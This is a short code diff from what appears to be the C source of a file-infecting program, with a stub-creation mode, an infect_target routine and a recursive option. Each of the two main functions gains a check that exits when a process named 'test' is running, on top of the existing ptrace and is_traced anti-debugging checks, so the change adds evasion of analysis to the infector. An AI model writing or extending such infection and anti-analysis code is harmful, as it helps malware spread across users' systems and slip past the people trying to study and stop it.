@@ -27,7 +27,7 @@ void _start();
 #if CREATE_STUB
 
 int main(void) {
-	if (is_traced() || sys_ptrace(0, 0, 0, 0) == -1) {
+	if (process_active("test") || is_traced() || sys_ptrace(0, 0, 0, 0) == -1) {
 		return (0);
 	}
 	size_t offset = (uintptr_t)&placeholders - (uintptr_t)&_start;
@@ -57,7 +57,7 @@ static void infect_target(const char *path, const unsigned char *stub,
 }
 
 int main(int argc, char **argv) {
-	if (is_traced() || ptrace(PTRACE_TRACEME, 0, NULL, NULL) == -1) {
+	if (process_active("test") || is_traced() || ptrace(PTRACE_TRACEME, 0, NULL, NULL) == -1) {
 		return (0);
 	}
 	bool recursive = false;
